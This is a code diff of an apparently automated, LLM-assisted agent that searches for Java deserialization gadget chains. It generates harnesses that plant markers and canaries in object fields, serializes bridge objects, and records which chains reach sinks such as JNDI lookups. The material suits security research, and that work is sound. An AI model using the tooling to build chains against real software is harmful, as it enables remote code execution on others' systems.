+                    {"verdict": ("CHAIN_DEPTH2" if (r.get("hop2") or r.get("mapdispatch"))
+                                 else "HOP1_ONLY"),
                      "tax": "hop2_reach+batch", "carrier": r.get("carrier"),
                      "hop2": r.get("hop2"), "hop1": r.get("hop1"),
+                     "mapdispatch": r.get("mapdispatch"),
                      "receiver_method": r.get("receiver_method", "?"),
                      "receiver_hooks": r.get("hooks"),
                      "dispatch_stack": r.get("dispatch_stack", []),
@@ -1346,13 +1447,17 @@ class JGDChainCompleteAgent:
                     a_cache[hkey] = audit
                 self.state["evidence"].append({
                     "bridge": b["cls"], "receiver": recv_like["cls"],
-                    "result": {"verdict": "CHAIN_DEPTH2" if r["hop2"] else "HOP1_ONLY",
+                    "result": {"verdict": ("CHAIN_DEPTH2"
+                               if (r["hop2"] or r.get("mapdispatch"))
+                               else "HOP1_ONLY"),
                                "tax": "hop2_reach+batch",
                                "carrier": r.get("carrier"),
                                "dispatch_stack": r.get("dispatch_stack", []),
                                "deser_ex": r.get("ex", "")[:150]},
                     "ds_audit": audit, "ts": time.strftime("%FT%T"),
                     "audit_cached": cached})
+                # 逐条落盘 — 超时窗口截断不再丢失已产出的证据
+                self.save()
                 self.db.add([{"id": f"chain:{b['cls']}:{recv_like['cls']}",
                               "type": "complete_chain_evidence",
                               "tags": ["chain_depth2",
@@ -1389,7 +1494,7 @@ class JGDChainCompleteAgent:
         return self.state["verdict"]
 
     def reclassify(self) -> int:
-        """R18: 用修正后的判定语义重判存量 pair_results。
+        """用修正后的判定语义重判存量 pair_results。
 
         hop2=True 而被误判 NOT_FIRED 的对 → CHAIN_DEPTH2, 重新入队
         (在新模板的读侧标记下复验), 并立即回灌 ds 审计。
@@ -1439,14 +1544,14 @@ class JGDChainCompleteAgent:
         return fixed
 
     def reflect_with_ds(self) -> dict:
-        """R18: 与 ds 联合反思 — 全部失败分类 + hop2 发现 + 盲区质询。"""
+        """与 ds 联合反思 — 全部失败分类 + hop2 发现 + 盲区质询。"""
         results = self.state.get("pair_results", [])
         from collections import Counter
         tax = dict(Counter((p.get("tax") or "?").split(":")[0] for p in results))
         hop2_pairs = [{"bridge": p["bridge"], "receiver": p["receiver"]}
                       for p in results if p.get("hop2")]
         prompt = (
-            "你是 JGD 的联合反思审计员。挖掘 agent 的历史: R17 曾把"
+            "你是 JGD 的联合反思审计员。挖掘 agent 的历史:  曾把"
             "『异常栈帧证据』错当『必要条件』, 导致 18 对 hop2 触发被误判 NOT_FIRED"
             "(链完整走通时无异常无栈帧)。该回归已修正(hop2 可达性论证:\n"
             "标记物唯一可达路径=BAVE→桥→接收者→字段)。\n"
@@ -1475,7 +1580,7 @@ class JGDChainCompleteAgent:
         return out
 
     def audit_fires(self, cap: int = 400) -> int:
-        """R34: 补审计 — 批次触发但未及审计的 pair_results(带 dispatch_stack)。"""
+        """补审计 — 批次触发但未及审计的 pair_results(带 dispatch_stack)。"""
         ev_keys = {(e.get("bridge"), e.get("receiver"))
                    for e in self.state.get("evidence", [])}
         todo = [r for r in self.state.get("pair_results", [])
@@ -1516,7 +1621,7 @@ class JGDChainCompleteAgent:
         return len(todo)
 
     def entry_side_audit(self) -> dict:
-        """R32: 入口侧新颖性专审 — HashMap+hashCode桥 作为通用入口从未被 ds
+        """入口侧新颖性专审 — HashMap+hashCode桥 作为通用入口从未被 ds
         正面评估过(此前只评接收者侧)。"""
         ev = [e for e in self.state.get("evidence", [])
               if "ObjLongPair" in e.get("bridge", "")
@@ -1581,7 +1686,7 @@ MARKER2 = """import java.io.*;
 import java.lang.reflect.*;
 
 public class MV{n} implements Serializable, InvocationHandler {{
-    // R29(ds: 可观测分派栈): 标记物记录自身调用者栈 —— 直接证据
+    // (ds: 可观测分派栈): 标记物记录自身调用者栈 —— 直接证据
     // "桥.方法 → 接收者.方法 → 标记物", 不依赖异常
     static void mark() {{ try {{
         StackTraceElement[] st = new Throwable().getStackTrace();
@@ -1621,7 +1726,7 @@ public class CC{n} {{
                 System.out.println("RES=INST_FAIL"); return; }}
 
             // hop2 弹药: 接收者的可注入字段填标记对象/Proxy + String 字段填 canary 值
-            // R21(ds: 值可达性): sink 路径需要参数值(JNDI URL/表达式/路径) —
+            // (ds: 值可达性): sink 路径需要参数值(JNDI URL/表达式/路径) —
             // 标记对象不带值, String canary 让参数流可观测(异常消息回显)
             int inj2 = 0;
             for (Field f : rc.getDeclaredFields()) {{
@@ -1660,7 +1765,7 @@ public class CC{n} {{
             ByteArrayOutputStream bos = new ByteArrayOutputStream();
             new ObjectOutputStream(bos).writeObject(b);
             System.out.println("RES=SER_OK");
-            // R18: 清掉写侧(writeObject 钩子)可能触发的标记 —— 只认读侧
+            // 清掉写侧(writeObject 钩子)可能触发的标记 —— 只认读侧
             try {{ java.nio.file.Files.deleteIfExists(
                 java.nio.file.Paths.get("/tmp/jgdcc_{n}_hop2")); }}
             catch (Exception e) {{}}
